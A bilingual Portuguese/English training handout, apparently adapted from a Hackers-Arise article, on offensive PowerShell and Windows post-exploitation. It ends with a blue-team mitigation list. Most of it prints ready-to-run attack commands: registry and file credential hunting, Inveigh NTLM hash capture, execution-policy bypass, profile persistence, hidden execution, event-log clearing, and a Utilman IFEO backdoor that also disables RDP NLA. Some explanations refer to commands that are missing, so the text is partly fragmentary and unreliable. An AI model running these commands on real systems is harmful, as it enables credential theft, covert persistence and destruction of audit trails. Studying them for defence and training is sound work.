2. Contexto e Relevância / Context and Relevance Original

O PowerShell foi desenhado para administração e automação, com acesso direto ao .NET e ao WMI. Isso dá controlo sobre componentes do sistema, processos e configurações de rede. Inclui ferramentas living off the land (LOL) que permitem operar sem binários externos que disparem alertas — executar comandos, abrir sessões remotas, encontrar credenciais, verificar configuração, manipular o sistema e correr payloads em memória. O PowerShell ajuda a fundir-se na rotina normal do sistema. PowerShell was designed for administration and automation, with direct access to .NET and WMI. That gives control over system components, processes, and network configurations. It includes living off the land (LOL) tools that let you operate without external binaries that trigger alerts — execute commands, open remote sessions, find credentials, check configuration, manipulate the system, and run payloads in memory. PowerShell helps you blend into the normal system routine.
Nota do formador / Trainer's note:
O artigo assume alvos Windows antigos (ATMs, dispositivos médicos, POS) ainda em uso por restrições orçamentais. Defensores devem também compreender como o Windows pode ser usado em ataques — não é exclusivo de Linux. The article assumes older Windows targets (ATMs, medical devices, POS) still in use due to budget constraints. Defenders must also understand how Windows can be used for attacks — it's not Linux-only.

4. Credential Harvesting Original

4.1 Findstr Original

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.gif *.ps1 *.yml
Procura recursivamente (/S), sem distinguir maiúsculas (/I), a string "password" numa lista de extensões, listando apenas os ficheiros com correspondência (/M). Presente em todos os Windows. Recursively (/S), case-insensitively (/I) searches for "password" across listed extensions, listing only matching files (/M). Built into every Windows.

4.2 Registo / Registry Original

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
As duas primeiras pesquisam recursivamente valores de string contendo "password" em HKLM e HKCU. A 3.ª extrai a password reversível do WinVNC v3. A 4.ª verifica autologin (pode conter DefaultUsername/DefaultPassword em texto claro). A 5.ª verifica community strings SNMP. A 6.ª lê sessões PuTTY guardadas (IPs, usernames). First two recursively search string values containing "password" in HKLM and HKCU. 3rd extracts reversible WinVNC v3 password. 4th checks autologon (may hold plaintext DefaultUsername/DefaultPassword). 5th checks SNMP community strings. 6th reads saved PuTTY sessions (IPs, usernames).

4.3 LaZagne Original

Não é uma ferramenta PowerShell, mas é usada para extrair credenciais de browsers, clientes de email, WiFi, FTP e bases de dados, analisando ficheiros de configuração, registo e memória. Not a PowerShell tool, but used to extract credentials from browsers, email clients, WiFi, FTP, and databases by analyzing config files, registry, and memory.

4.4 SMB Hash Leak (Inveigh) Original

powershell -ep bypass
. .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -HTTPS Y -PROXY Y
Cria um atalho .lnk falso apontando para um recurso remoto inexistente. Quando o utilizador abre a pasta, o Windows tenta SMB e envia o hash NTLMv1/v2 para o servidor do atacante. Os hashes podem ser crackeados offline (Hashcat modo 5600) ou relayed. O sucesso depende de timing e configuração da interface de rede. Creates a fake .lnk shortcut pointing to a nonexistent remote resource. When the user opens the folder, Windows attempts SMB and sends the NTLMv1/v2 hash to the attacker's server. Hashes can be cracked offline (Hashcat mode 5600) or relayed. Success depends on timing and NIC configuration.

5. Execution Policy Original

powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope LocalMachine -Force
A execution policy controla se e como scripts PowerShell correm. -ep bypass contorna apenas na sessão atual. Set-ExecutionPolicy altera persistentemente para toda a máquina (requer admin), exceto se o Group Policy sobrepuser. Execution policy controls whether and how PowerShell scripts run. -ep bypass bypasses for the current session only. Set-ExecutionPolicy changes it persistently machine-wide (admin required), unless overridden by Group Policy.

11. Persistência via Profile / Profile Persistence Original

Add-Content -Path $Profile -Value "C:\Windows\Temp\script.ps1"
Set-ExecutionPolicy Bypass -Scope LocalMachine -Force
Anexa uma chamada ao script malicioso ao perfil PowerShell ($Profile), executado automaticamente em cada nova sessão. A segunda linha garante que a execution policy não bloqueia. Appends a call to the malicious script to the PowerShell profile ($Profile), run automatically on every new session. The second line ensures execution policy won't block it.

12. Execução Furtiva / Stealth Execution Original

Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\script.ps1"
powershell.exe -NoProfile -Command "Write-Output 'Hackers-Arise!'"
-WindowStyle Hidden evita janela visível (sem flash para a vítima). -NoProfile evita carregar perfis, reduzindo rastos. -WindowStyle Hidden prevents a visible window (no flash alerting the victim). -NoProfile skips profile loading, reducing traces.

Lists session history, reads the persistent PSReadLine file, and overwrites it with empty (rather than deleting it, which could raise suspicion). Holds the last 50 entries by default.

Queries, forces run, and deletes.

16. Sessions Original

qwinsta

quser/qwinsta mostram sessões ativas (utilizador, idle time). A 3.ª linha filtra o utilizador, faz split por espaços e usa o ID da sessão (índice 2) para logoff. A última remove a pasta de perfil criada acidentalmente (após terminar a sessão). quser/qwinsta show active sessions (user, idle time). 3rd line filters the user, splits by whitespace, and uses the session ID (index 2) for logoff. Last removes an accidentally created profile folder (after killing the session).

17. Limpeza de Logs / Log Clearing Original

Clear-EventLog Security,System,Application; "Windows PowerShell","Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-WMI-Activity/Operational" | ForEach-Object { & "$env:windir\System32\wevtutil.exe" cl $_ }
Primeiro limpa os logs clássicos (Security, System, Application) com Clear-EventLog; depois usa wevtutil.exe cl para limpar os logs modernos do PowerShell e WMI — apagando rastos. First clears classic logs (Security, System, Application) with Clear-EventLog; then uses wevtutil.exe cl to clear modern PowerShell and WMI logs — covering tracks.

18. Backdoor via Utilman Original

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
A chave IFEO faz com que utilman.exe (botão "Acesso Fácil" no login) seja substituído por cmd.exe. Ao premir Win+U no login, abre-se um CMD com privilégios SYSTEM. A segunda chave desativa o NLA no RDP, permitindo sessão RDP sem credenciais válidas. Requer reboot (ou usar Sticky Keys para evitar reboot). The IFEO key makes utilman.exe (the "Ease of Access" button at login) launch cmd.exe. Pressing Win+U at login opens a CMD with SYSTEM privileges. The second key disables NLA on RDP, allowing an RDP session without valid credentials. Requires reboot (or use Sticky Keys to avoid rebooting).

20. Mitigações Blue Team / Blue Team Mitigations Complementar / Complementary

  1. Script Block Logging (4104) + Module Logging (4103) — apanham iex, Base64, fileless. / catch iex, Base64, fileless.
  2. AMSI ativo — deteta iex (iwr ...) em tempo real. / detects iex (iwr ...) in real time.
  3. Constrained Language Mode — bloqueia New-Object, Add-Type. / blocks them.
  4. AppLocker/WDAC — restringe .ps1 a caminhos assinados; bloqueia powershell -ep bypass. / restricts .ps1 to signed paths; blocks -ep bypass.
  5. Desativar PowerShell 2.0 — evita downgrade. / prevents downgrade. 
    Disable-WindowsOptionalFeature -FeatureName MicrosoftWindowsPowerShellV2 -Online
  6. Proteger IFEO — ACLs restritas em HKLM\...\Image File Execution Options; monitorizar criação de chaves Debugger. / restrict ACLs; monitor Debugger key creation.
  7. Exigir NLA no RDP — GPO: Require user authentication for remote connections by using Network Level Authentication. / enforce NLA via GPO.
  8. Monitorizar schtasks (Event ID 4698) e tarefas com nome legítimo mas binário em C:\Windows\Temp. / monitor schtasks and legit-named tasks with binaries in Temp.
  9. Monitorizar limpeza de logs (Event ID 1102, 104) e wevtutil cl. / monitor log clearing.
  10. Proteger ConsoleHost_history.txt com ACLs e centralizar logs. / protect with ACLs and centralize logs.
  11. Egress filtering — bloqueia Pastebin, GitHub raw, IPs de C2. / blocks Pastebin, GitHub raw, C2 IPs.
  12. Desativar autologon e limpar DefaultPassword do Winlogon. / disable autologon and clear DefaultPassword.
